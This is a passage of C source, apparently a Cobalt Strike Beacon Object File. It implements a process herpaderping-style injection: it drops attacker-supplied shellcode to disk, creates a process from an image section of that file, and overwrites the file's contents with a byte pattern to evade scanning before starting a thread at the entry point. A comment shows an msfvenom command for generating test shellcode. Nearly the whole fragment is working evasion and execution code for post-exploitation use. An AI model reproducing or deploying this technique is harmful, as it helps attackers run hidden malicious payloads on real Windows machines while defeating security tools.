    //   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o popCalc.bin
    unsigned char* shellcode;
    SIZE_T shellcode_len;

    BeaconDataParse(&parser, buff, len);
    shellcode_len = BeaconDataLength(&parser);
    shellcode = (unsigned char*)BeaconDataExtract(&parser, NULL);
    // Declare variables / structs
    HANDLE hProc = NULL;
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    STARTUPINFO sInfo;
    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    PROCESS_INFORMATION pInfo;
    // Declare booleans as WINBOOL in BOFs. "bool" will not work
    
    // Pointer to the RE memory in the remote process we spawn. Returned from when we call WriteProcessMemory with a handle to the remote process
    void* remotePayloadAddr;
    //ULONG_PTR dwData = NULL;
    SIZE_T bytesWritten;

    BeaconPrintf(CALLBACK_OUTPUT, "shellcode len: %d\n", shellcode_len);
    BeaconPrintf(CALLBACK_OUTPUT, "shellcode addr: 0x%p\n", shellcode);

    HANDLE targetFileHandle = KERNEL32$CreateFileA("C:\\Users\\Administrator\\Desktop\\myfile2.exe",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "targetFileHandle 0x%p\n", targetFileHandle);
    
    if(targetFileHandle == INVALID_HANDLE_VALUE){
        BeaconPrintf(CALLBACK_OUTPUT, "Failed CreateFile targetFileHandle 0x%p\n", targetFileHandle);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "Success CreateFile targetFileHandle 0x%p\n", targetFileHandle);
    
    }
    if(!CopyBytesByHandle(shellcode, shellcode_len, targetFileHandle)){
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }

    HANDLE sectionHandle;
    NTSTATUS res = NTDLL$NtCreateSection(&sectionHandle,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        targetFileHandle);

    if (res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] SectionHandle failed. sectionHandle: 0x%p\n",sectionHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateSection success. sectionHandle: 0x%p\n",sectionHandle);
    }

    HANDLE processHandle;
    res = NTDLL$NtCreateProcessEx(&processHandle,
        PROCESS_ALL_ACCESS,
        NULL,
        KERNEL32$GetCurrentProcess(),
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        sectionHandle,
        NULL,
        NULL,
        0);
    if(!KERNEL32$CloseHandle(sectionHandle)){
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close sectionHandle\n");
    }

    if (res != NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] NtCreateProcessEx failed. processHandle: 0x%p\n",processHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateProcessEx success. processHandle: 0x%p\n",processHandle);
    }
    DWORD imageEntryPointRva = 0;
    GetImageEntryPointRva(targetFileHandle, &imageEntryPointRva);
    BeaconPrintf(CALLBACK_OUTPUT, "EntryPoint RVA: 0x%08x\n", imageEntryPointRva);

    BYTE pattern[4] = {'\x82', '\x7f', '\x76', '\x7c'};
    int patternLength = 4;
    
    if(!OverwriteFileContentsWithPattern(targetFileHandle, (PBYTE)(&(pattern[0])), patternLength)){
        KERNEL32$CloseHandle(processHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    
    PROCESS_BASIC_INFORMATION pbi;

    NTSTATUS status = NTDLL$NtQueryInformationProcess(processHandle,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        NULL);
    if (status != NT_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to query new process info\n");
        KERNEL32$CloseHandle(processHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    PEB peb;

    if (!KERNEL32$ReadProcessMemory(processHandle, (LPCVOID)pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), (SIZE_T *)NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get target PEB\n");
        KERNEL32$CloseHandle(processHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "Writing process parameters, remote PEB ProcessParameters 0x%p\n",
        (PBYTE)pbi.PebBaseAddress+FIELD_OFFSET(PEB, ProcessParameters));
    

    if(!WriteRemoteProcessParameters(
        processHandle,
        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
        L"",
        L"",
        L"\"C:\\Users\\Administrator\\Desktop\\myfile2.exe\"",
        NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment,
        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
        L"WinSta0\\Default",
        L"",
        L"")){
            KERNEL32$CloseHandle(processHandle);
            KERNEL32$CloseHandle(targetFileHandle);
            return;
        }

    void* remoteEntryPoint = (LPBYTE)peb.ImageBaseAddress + imageEntryPointRva;
    BeaconPrintf(CALLBACK_OUTPUT, "Creating thread in process at entry point 0x%p\n", remoteEntryPoint);

    HANDLE threadHandle;
    status = NTDLL$NtCreateThreadEx(&threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        processHandle,
        remoteEntryPoint,
        NULL,
        0,
        0,
        0,
        0,
        NULL);
    if (status == NT_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,"Spawned thread with tId: %d\n",KERNEL32$GetThreadId(threadHandle));
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "failed ntCreateThreadEx. ThreadHandle: 0x%p\n", threadHandle);
        KERNEL32$CloseHandle(processHandle);
        KERNEL32$CloseHandle(targetFileHandle);
        return;
    }
    if(!KERNEL32$CloseHandle(threadHandle)){
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close threadHandle\n");
        
    }
    if(!KERNEL32$CloseHandle(processHandle)){
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close processHandle\n");
        
    }
    if(!KERNEL32$CloseHandle(targetFileHandle)){
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Not able to close targetFileHandle\n");
    }
    return;

}
